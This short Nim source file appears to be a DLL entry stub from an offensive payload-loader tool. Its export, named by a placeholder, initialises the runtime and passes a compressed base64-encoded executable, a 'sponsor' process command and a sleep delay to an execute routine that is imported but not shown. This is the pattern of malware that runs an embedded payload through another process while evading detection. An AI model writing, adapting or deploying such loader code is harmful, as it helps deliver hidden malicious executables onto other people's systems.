import main
import params

proc NimMain() {.cdecl, importc.}

proc DLL_EXPORT_NAME() : void {.stdcall, exportc, dynlib.} =
    NimMain()
    # Execute
    discard execute(
        compressedBase64PE = compressedBase64PE, 
        sponsorCmd = sponsorPath & sponsorParams,
        sleepSeconds = sleepSeconds
    )